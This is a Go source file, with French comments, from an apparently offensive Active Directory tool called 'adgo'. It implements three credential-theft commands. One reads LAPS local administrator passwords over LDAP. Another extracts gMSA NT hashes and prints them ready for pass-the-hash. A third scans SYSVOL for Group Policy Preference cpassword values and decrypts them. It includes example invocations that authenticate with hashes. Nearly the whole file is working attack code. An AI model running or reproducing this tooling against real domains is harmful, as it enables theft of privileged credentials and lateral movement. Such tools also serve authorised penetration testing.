// cmd/adgo/commands/laps_cmd.go
//
// Commandes de récupération de mots de passe "cachés" :
//
//   adgo laps                   → liste tous les mdp LAPS accessibles
//   adgo laps --computer DC01   → mdp LAPS d'un ordinateur spécifique
//   adgo gmsa                   → NT hashes des comptes gMSA accessibles
//   adgo gpp                    → scan SYSVOL pour cpassword GPP

package commands

import (
	"context"
	"encoding/hex"
	"fmt"
	"strings"

	"adgo/pkg/common"
	"adgo/pkg/ldap"
	"adgo/pkg/smb"

	"github.com/spf13/cobra"
)

// ============================================================
// adgo laps
// ============================================================

var LAPSCmd = &cobra.Command{
	Use:   "laps",
	Short: "Retrieve LAPS passwords (ms-Mcs-AdmPwd / msLAPS-Password)",
	Long: `Read LAPS (Local Administrator Password Solution) passwords via LDAP.
Requires read access on ms-Mcs-AdmPwd for target computers.

Examples:
  adgo laps --dc-ip 192.168.1.10 -u admin -p pass -d LAB
  adgo laps --dc-ip 192.168.1.10 -u admin --hash aad3b435... -d LAB
  adgo laps --dc-ip 192.168.1.10 -u admin -p pass -d LAB --computer WEB01`,
	RunE: func(cmd *cobra.Command, args []string) error {
		ctx := context.Background()
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		computer, _ := cmd.Flags().GetString("computer")

		creds, err := requireCredsWithDCIP(dcIP)
		if err != nil {
			return err
		}

		server := buildLDAPServer(dcIP, creds)
		common.PrintInfo(fmt.Sprintf("LAPS → %s as %s\\%s", server, strings.ToUpper(creds.SMBDomain), creds.SMBUsername))

		client, err := ldap.NewClientNTLM(ctx, server, creds.SMBDomain, creds.SMBUsername, creds.Password, creds.NTLMHash, false)
		if err != nil {
			return fmt.Errorf("LDAP connection failed: %v", err)
		}
		defer client.Close()

		baseDN := buildBaseDN(creds)

		if computer != "" {
			// Un seul ordinateur
			entry, err := client.GetLAPSForComputer(baseDN, computer)
			if err != nil {
				return fmt.Errorf("LAPS retrieval failed: %v", err)
			}
			printLAPSEntry(entry)
			return nil
		}

		// Tous les ordinateurs accessibles
		entries, err := client.GetLAPSPasswords(baseDN)
		if err != nil {
			return fmt.Errorf("LAPS enumeration failed: %v", err)
		}

		if len(entries) == 0 {
			common.PrintWarning("No LAPS passwords found (no rights or LAPS not deployed)")
			return nil
		}

		common.PrintSuccess(fmt.Sprintf("Found %d LAPS password(s)", len(entries)))
		common.PrintTable(
			[]string{"COMPUTER", "PASSWORD", "EXPIRES", "VERSION"},
			ldap.FormatLAPSTable(entries),
		)
		return nil
	},
}

func printLAPSEntry(e *ldap.LAPSEntry) {
	exp := "Never"
	if !e.Expiration.IsZero() {
		exp = e.Expiration.Format("2006-01-02 15:04")
	}
	ver := "LAPSv1"
	if e.LAPSVersion == 2 {
		ver = "LAPSv2"
	}
	common.PrintSuccess(fmt.Sprintf("LAPS password for %s (%s)", e.ComputerName, ver))
	common.PrintFound("Computer", e.ComputerName)
	common.PrintFound("Password", e.Password)
	common.PrintFound("Expires", exp)
}

// ============================================================
// adgo gmsa
// ============================================================

var GMSACmd = &cobra.Command{
	Use:   "gmsa",
	Short: "Retrieve gMSA NT hashes (msDS-ManagedPassword)",
	Long: `Read gMSA (Group Managed Service Account) NT hashes via LDAP.
Requires membership in the group allowed to read msDS-ManagedPassword.

Examples:
  adgo gmsa --dc-ip 192.168.1.10 -u admin -p pass -d LAB
  adgo gmsa --dc-ip 192.168.1.10 -u svc_reader --hash aad3b435... -d LAB`,
	RunE: func(cmd *cobra.Command, args []string) error {
		ctx := context.Background()
		dcIP, _ := cmd.Flags().GetString("dc-ip")

		creds, err := requireCredsWithDCIP(dcIP)
		if err != nil {
			return err
		}

		server := buildLDAPServer(dcIP, creds)
		common.PrintInfo(fmt.Sprintf("gMSA → %s as %s\\%s", server, strings.ToUpper(creds.SMBDomain), creds.SMBUsername))

		client, err := ldap.NewClientNTLM(ctx, server, creds.SMBDomain, creds.SMBUsername, creds.Password, creds.NTLMHash, false)
		if err != nil {
			return fmt.Errorf("LDAP connection failed: %v", err)
		}
		defer client.Close()

		baseDN := buildBaseDN(creds)
		entries, err := client.GetGMSAPasswords(baseDN)
		if err != nil {
			return fmt.Errorf("gMSA enumeration failed: %v", err)
		}

		if len(entries) == 0 {
			common.PrintWarning("No gMSA accounts found")
			return nil
		}

		readable := 0
		for _, e := range entries {
			if !strings.HasPrefix(e.NTHash, "(") {
				readable++
			}
		}

		common.PrintSuccess(fmt.Sprintf("Found %d gMSA account(s) (%d NT hash(es) readable)", len(entries), readable))
		common.PrintTable(
			[]string{"ACCOUNT", "NT HASH", "DN"},
			ldap.FormatGMSATable(entries),
		)

		// Afficher le format Pass-the-Hash pour les hashes lisibles
		for _, e := range entries {
			if !strings.HasPrefix(e.NTHash, "(") {
				account := e.AccountName
				if !strings.HasSuffix(account, "$") {
					account += "$"
				}
				common.PrintCredential(creds.SMBDomain, account, "aad3b435b51404eeaad3b435b51404ee:"+e.NTHash)
			}
		}
		return nil
	},
}

// ============================================================
// adgo gpp
// ============================================================

var GPPCmd = &cobra.Command{
	Use:   "gpp",
	Short: "Find GPP passwords in SYSVOL (Groups.xml, Services.xml...)",
	Long: `Scan SYSVOL for Group Policy Preference files containing cpassword.
The AES key was published by Microsoft (MS14-025) — all cpasswords can be decrypted.

Files scanned: Groups.xml, Services.xml, ScheduledTasks.xml,
               DataSources.xml, Printers.xml, Drives.xml

Examples:
  adgo gpp --dc-ip 192.168.1.10 -u user -p pass -d LAB
  adgo gpp --dc-ip 192.168.1.10 -u user --hash aad3b435... -d LAB

Tip: any authenticated domain user can read SYSVOL.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")

		creds, err := requireCredsWithDCIP(dcIP)
		if err != nil {
			return err
		}

		if dcIP == "" {
			return fmt.Errorf("--dc-ip required for GPP scan")
		}

		// Décoder le hash si fourni
		var hashBytes []byte
		if creds.NTLMHash != "" {
			hashBytes, err = hex.DecodeString(creds.NTLMHash)
			if err != nil {
				return fmt.Errorf("invalid NT hash: %v", err)
			}
		}

		common.PrintInfo(fmt.Sprintf("GPP scan → \\\\%s\\SYSVOL as %s\\%s", dcIP, strings.ToUpper(creds.SMBDomain), creds.SMBUsername))
		common.PrintInfo("Scanning GPP files (Groups.xml, Services.xml, ScheduledTasks.xml...)")

		passwords, err := smb.ScanGPPPasswords(dcIP, creds.SMBUsername, creds.SMBDomain, creds.Password, hashBytes)
		if err != nil {
			return fmt.Errorf("GPP scan failed: %v", err)
		}

		if len(passwords) == 0 {
			common.PrintWarning("No GPP passwords found in SYSVOL")
			return nil
		}

		common.PrintSuccess(fmt.Sprintf("Found %d GPP password(s)!", len(passwords)))

		rows := make([][]string, 0, len(passwords))
		for _, p := range passwords {
			rows = append(rows, []string{
				p.Type,
				p.Username,
				p.Password,
				p.GPO,
				p.Changed,
			})
		}
		common.PrintTable(
			[]string{"TYPE", "USERNAME", "PASSWORD", "GPO", "CHANGED"},
			rows,
		)

		// Afficher les credentials trouvés de façon très visible
		fmt.Println()
		for _, p := range passwords {
			common.PrintCredential(creds.SMBDomain, p.Username, p.Password)
		}

		return nil
	},
}

// ============================================================
// Helpers partagés entre les commandes de ce fichier
// ============================================================

func requireCredsWithDCIP(dcIP string) (*common.Credentials, error) {
	creds, err := common.LoadCredentials()
	if err != nil && dcIP == "" {
		return nil, fmt.Errorf("credentials error: %v\nUsage: adgo laps --dc-ip <IP> -u <USER> -p <PASS> -d <DOMAIN>", err)
	}
	if err != nil {
		// Essayer de construire des creds minimaux depuis les flags globaux
		creds = &common.Credentials{
			SMBUsername: common.Username,
			Password:    common.Password,
			SMBDomain:   common.Domain,
			NTLMHash:    common.NTLMHash,
		}
	}
	if creds.SMBUsername == "" {
		return nil, fmt.Errorf("username required: -u USER")
	}
	if creds.SMBDomain == "" {
		return nil, fmt.Errorf("domain required: -d DOMAIN")
	}
	if creds.Password == "" && creds.NTLMHash == "" {
		return nil, fmt.Errorf("password or hash required: -p PASS or --hash NTHASH")
	}
	return creds, nil
}

func buildLDAPServer(dcIP string, creds *common.Credentials) string {
	if dcIP != "" {
		return fmt.Sprintf("ldap://%s:389", dcIP)
	}
	if creds.LDAPServer != "" {
		if !strings.HasPrefix(creds.LDAPServer, "ldap") {
			return "ldap://" + creds.LDAPServer
		}
		return creds.LDAPServer
	}
	return ""
}

func buildBaseDN(creds *common.Credentials) string {
	if creds.BaseDN != "" {
		return creds.BaseDN
	}
	domain := creds.SMBDomain
	if domain == "" {
		return ""
	}
	parts := strings.Split(strings.ToLower(domain), ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}

func init() {
	// Flags LAPS
	LAPSCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	LAPSCmd.Flags().String("computer", "", "Target a specific computer (e.g. WEB01)")

	// Flags gMSA
	GMSACmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")

	// Flags GPP
	GPPCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
}
